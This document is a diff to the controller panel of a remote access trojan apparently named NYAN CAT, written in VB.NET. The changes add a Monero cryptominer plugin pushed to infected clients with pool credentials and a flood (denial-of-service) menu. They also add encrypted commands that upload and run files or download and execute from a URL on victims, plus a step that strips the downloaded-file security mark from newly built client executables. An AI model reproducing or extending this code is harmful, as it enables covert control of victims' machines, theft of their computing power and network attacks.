@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/19/2018        ##
+'##         N Y A N   C A T  |||   Updated on Aug/20/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -164,7 +164,7 @@ Public Class Main
                             u.L.SubItems(NOTE_.Index).Text = GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USERN.Index).Text + " Note")
                         End If
 
-                        Fix()
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                     End SyncLock
 
                     Messages("{" + u.IP.Split(":")(0) + "}", "Connected")
@@ -190,7 +190,7 @@ Public Class Main
                         u.IsPinged = False
                         u.L.SubItems(PING.Index).Text = u.MS & "ms"
                         u.MS = 0
-                        Fix()
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                     End SyncLock
                     Exit Select
 
@@ -201,7 +201,7 @@ Public Class Main
                     End If
                     SyncLock L1.Items
                         u.L.SubItems(RANS.Index).Text = A(1).ToString
-                        Fix()
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                     End SyncLock
                     Exit Select
 
@@ -217,7 +217,18 @@ Public Class Main
                         Else
                             u.L.SubItems(SP.Index).Text = A(1).ToString
                         End If
-                        Fix()
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    End SyncLock
+                    Exit Select
+
+                Case "!X"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+                    SyncLock L1.Items
+                        u.L.SubItems(XMR.Index).Text = A(1).ToString
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                     End SyncLock
                     Exit Select
 
@@ -802,7 +813,7 @@ Public Class Main
 
             End Select
         Catch ex As Exception
-            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
+            Messages(u.IP.Split(":")(0), ex.Message)
         End Try
     End Sub
 #End Region
@@ -835,6 +846,9 @@ Public Class Main
 
             ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
                 e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.LightSteelBlue, New PointF(e.Bounds.X, e.Bounds.Y))
+
+            ElseIf L2.Items(e.Index).ToString.Contains("Flood!") Then
+                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.Olive, New PointF(e.Bounds.X, e.Bounds.Y))
 
             Else
                 e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, W, New PointF(e.Bounds.X, e.Bounds.Y))
@@ -1204,6 +1218,38 @@ Public Class Main
         End Try
     End Sub
 
+    Private Sub XMRMinerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XMRMinerToolStripMenuItem.Click
+        Try
+            If L1.SelectedItems.Count > 0 Then
+                Dim miner As New XMR
+                miner.ShowDialog()
+                Dim MS As New IO.MemoryStream
+                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+                Dim F = Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\XMR.dll"))
+                Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "XMR-R|'P'|" + miner.cpu + "|'P'|" + miner.url + "|'P'|" + miner.user + "|'P'|" + miner.pass + "|'P'|" + F))
+                MS.Write(CMD, 0, CMD.Length)
+
+                For Each x As ListViewItem In L1.SelectedItems
+                    If miner.OK = True AndAlso miner.K = False Then
+                        If Not x.SubItems(XMR.Index).Text = "Running" Then
+                            S.SendData(x.Tag, MS.ToArray)
+                        End If
+                    ElseIf miner.K = True Then
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "XMR-K|'P'|")
+                    End If
+                Next
+                MS.Dispose()
+            End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub TestToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TestToolStripMenuItem.Click
+        Floods.Show()
+    End Sub
+
 #End Region
 
 #Region "PC Options"
@@ -1241,9 +1287,15 @@ Public Class Main
         End With
 
         If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+            Dim MS As New IO.MemoryStream
+            Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+            Dim F = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True))
+            Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
+            MS.Write(CMD, 0, CMD.Length)
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
+                S.SendData(x.Tag, MS.ToArray)
             Next
+            MS.Dispose()
         End If
     End Sub
 
@@ -1314,10 +1366,15 @@ Public Class Main
             End With
 
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-
+                Dim MS As New IO.MemoryStream
+                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+                Dim F = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True))
+                Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
+                MS.Write(CMD, 0, CMD.Length)
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RD-|'P'|" + o.FileName + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True)))
+                    S.SendData(x.Tag, MS.ToArray)
                 Next
+                MS.Dispose()
             End If
         Catch ex As Exception
         End Try
@@ -1331,9 +1388,7 @@ Public Class Main
             Exit Sub
         Else
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "RU-" & SPL & URL & SPL & EXE)
-                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL + "|'P'|" + EXE)
-
+                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL.ToString + "|'P'|" + EXE.ToString)
             Next
         End If
     End Sub
@@ -1403,9 +1458,6 @@ Public Class Main
     End Sub
 
 
-
-
-
 #End Region
 
 #Region "Auto-Update"
@@ -1470,6 +1522,11 @@ Public Class Main
             If result = DialogResult.No Then
                 Return
             ElseIf result = DialogResult.Yes Then
+
+                If Not IO.File.Exists(Application.StartupPath & "\Misc\Stub\Stub.il") Then
+                    MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
+                    Return
+                End If
 
                 If radioNET2.Checked Then
                     If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe") Then
@@ -1627,8 +1684,9 @@ Public Class Main
                     End If
                     MsgBox("Your Client Has been Created Successfully", MsgBoxStyle.Information, "DONE!")
                     My.Settings.Save()
-                        definition.Dispose()
-                        Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
+                    definition.Dispose()
+                    Try : DeleteZoneIdentifier(Application.StartupPath + "\" + "NEW-CLIENT.exe") : Catch : End Try
+                    Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
                     End If
                 End If
         Catch ex1 As Exception
@@ -1699,6 +1757,7 @@ Public Class Main
             MsgBox(ex.Message, MsgBoxStyle.Exclamation)
         End Try
     End Sub
+
 
 
 #End Region
